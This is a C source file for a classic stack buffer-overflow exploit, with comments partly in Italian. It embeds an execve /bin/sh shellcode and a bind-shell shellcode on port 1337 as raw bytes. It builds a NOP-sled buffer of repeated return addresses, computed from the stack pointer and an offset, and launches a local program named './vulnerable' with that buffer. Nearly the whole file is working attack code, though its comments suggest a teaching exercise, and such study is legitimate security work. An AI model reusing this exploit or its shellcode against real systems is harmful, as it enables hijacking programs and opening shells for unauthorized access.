#include<stdlib.h>

#define BUFFERSIZE 600 // vulnerable buffer + 100 bytes

//JMP-CALL-POP exeecve shell
char lunixshell[] = "\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89"
"\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";

// bindhsell on port 1337
char linuxshell[] = "\x6a\x66\x58\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\x99\xcd\x80\x96\x52\x66\x68\x05\x39"
"\x43\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x6a\x66\x58\xcd\x80\x53\x6a\x04\x5b\x56\x89\xe1\x6a\x66\x58\xcd\x80"
"\x52\x52\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x93\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

/*
    Funzione che ritorna un long senza segno -> indirizzo 
*/
unsigned long sp(void){
    __asm__("movl %esp, %eax"); // istruzione in linguaggio Assembly. Non viene compilato dal compilatore gcc come linguaggio C
}

int main(int argc, char *argv[]){
    int i, offset, os;
    long esp, ret, *addr_ptr;
    char *buffer, *ptr, *osptr;

    if (argc < 2) return; // quit if offset is not specified

    offset = atoi(argv[1]);     // get the offset specified
    esp = sp();                 // get the stack pointer (indirizzo alla testa dello stack)
    ret = esp-offset;           // sp - offset = return address. Indirizzo con cui vado a sovrascrivere quello di ritorno del programma vulnerabile.

    printf("Stack pointer: 0x%x\n", esp);
    printf("       Offset: 0x%x\n", offset);
    printf("  Return addr: 0x%x\n", ret);

    // Allocate memory for the buffer
    if (!(buffer = malloc(BUFFERSIZE))) {
        printf("Couldn't allocate memory. \n");
        exit(-1);
    }

    // Fill buffer with ret addr's
    ptr = buffer;
    addr_ptr = (long *) ptr;
    for (i = 0; i < BUFFERSIZE; i += 4)
        *(addr_ptr++) = ret;
    
    // Fill first half of buffer with NOPs
    for (i = 0; i < BUFFERSIZE/2; i++)
        buffer[i] = '\x90';

    // Insert Shellcode in the middle
    ptr = buffer + ((BUFFERSIZE/2) - (strlen(lunixshell)/2));
    for (i = 0; i < strlen(lunixshell); i++)
        *(ptr++) = lunixshell[i];
    // 300 bytes NOPs + 30/40 bytes Shellcode + Rimanenti Indirizzo di Ritorno Ripetuto
    
    // Call the vulnerable program passing the exploit buffer as the argument
    buffer[BUFFERSIZE-1] = 0;
    execl("./vulnerable", "vulnerable", buffer, 0);
    // Quando il sistema operativo manda in esecuzione due processi uno dopo l'altro
    // alloca i loro segmenti di memoria in maniera contigua

    return 0;
}